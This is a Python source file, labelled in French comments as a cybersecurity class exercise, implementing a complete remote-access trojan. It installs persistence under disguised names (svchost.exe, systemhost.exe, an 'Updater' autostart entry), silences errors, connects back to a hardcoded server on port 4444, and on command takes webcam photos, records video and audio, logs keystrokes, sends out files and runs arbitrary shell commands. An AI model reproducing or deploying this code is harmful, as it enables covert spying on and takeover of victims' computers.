import os
import sys
import shutil
import platform

def add_persistence():
    try:
        current = os.path.abspath(sys.argv[0])
        if platform.system() == "Windows":
            # Copie vers AppData
            target = os.path.join(os.getenv("APPDATA"), "svchost.exe")
            if current != target:
                shutil.copy2(current, target)
                os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d "{target}" /f')
        elif platform.system() == "Linux":
            # Copie vers ~/.local/bin
            home = os.path.expanduser("~")
            target = os.path.join(home, ".local", "bin", "updater.py")
            autostart_dir = os.path.join(home, ".config", "autostart")
            autostart_file = os.path.join(autostart_dir, "updater.desktop")

            if current != target:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                shutil.copy2(current, target)

                os.makedirs(autostart_dir, exist_ok=True)
                with open(autostart_file, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=Updater
Exec=python3 {target}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
    except Exception as e:
        pass  # Silence les erreurs

add_persistence()

# === Reverse Shell Client - TP Cybersécurité ===
# 📦 Fonctions : webcam, audio, vidéo, keylogger, file exfiltration, commandes, mot de passe, persistance

import socket, subprocess, os, cv2, base64, tempfile, sounddevice as sd
from scipy.io.wavfile import write as wav_write
from pynput import keyboard
import threading, time, sys

SERVER_IP = '192.168.0.131'  # À modifier
SERVER_PORT = 4444
AUTH_PASSWORD = 'Samglish'

# Dossier temporaire pour enregistrements
TEMP_DIR = tempfile.gettempdir()

# === Persistance Windows ===
def persist():
    try:
        target_path = os.path.join(os.getenv('APPDATA'), 'systemhost.exe')
        if not os.path.exists(target_path):
            import shutil
            shutil.copyfile(sys.executable, target_path)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v systemhost /t REG_SZ /d "{target_path}"', shell=True)
    except:
        pass

# === Webcam snapshot ===
def capture_webcam():
    filename = os.path.join(TEMP_DIR, 'cam.jpg')
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(filename, frame)
        cam.release()
        return filename
    except:
        return None

# === Capture vidéo (10s) ===
def capture_video():
    filename = os.path.join(TEMP_DIR, 'video.avi')
    try:
        cam = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        for _ in range(200):  # ~10s à 20fps
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        cam.release()
        out.release()
        return filename
    except:
        return None

# === Capture micro (10s) ===
def capture_audio():
    filename = os.path.join(TEMP_DIR, 'audio.wav')
    try:
        fs = 44100
        seconds = 10
        audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        wav_write(filename, fs, audio)
        return filename
    except:
        return None

# === Keylogger ===
keys_logged = []
def on_press(key):
    try:
        keys_logged.append(str(key.char))
    except AttributeError:
        keys_logged.append(f"[{key}]")

def start_keylogger():
    def log_keys():
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    thread = threading.Thread(target=log_keys, daemon=True)
    thread.start()

# === Envoi de fichiers (en base64) ===
def send_file(sock, filepath):
    try:
        with open(filepath, 'rb') as f:
            data = base64.b64encode(f.read())
            sock.sendall(data)
    except:
        sock.send(b"[!] Failed to send file.")

# === Main Loop ===
def connect():
    start_keylogger()
    persist()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            s.send(b'[+] Connection Established. Enter password:')
            password = s.recv(1024).decode().strip()
            if password != AUTH_PASSWORD:
                s.send(b'[!] Wrong password. Closing.')
                s.close()
                break
            s.send(b'[+] Authenticated.')

            while True:
                data = s.recv(1024).decode().strip()
                if data == "exit":
                    break
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:])
                        s.send(f"Changed to {os.getcwd()}".encode())
                    except:
                        s.send(b"[!] Failed to change directory.")
                elif data == "webcam_snap":
                    path = capture_webcam()
                    send_file(s, path)
                elif data == "video_capture":
                    path = capture_video()
                    send_file(s, path)
                elif data == "record_audio":
                    path = capture_audio()
                    send_file(s, path)
                elif data == "get_keys":
                    s.send("".join(keys_logged).encode())
                elif data.startswith("download "):
                    path = data.split(" ", 1)[1]
                    send_file(s, path)
                else:
                    output = subprocess.getoutput(data)
                    s.send(output.encode())
            break
        except:
            time.sleep(10)

if __name__ == "__main__":
    connect()
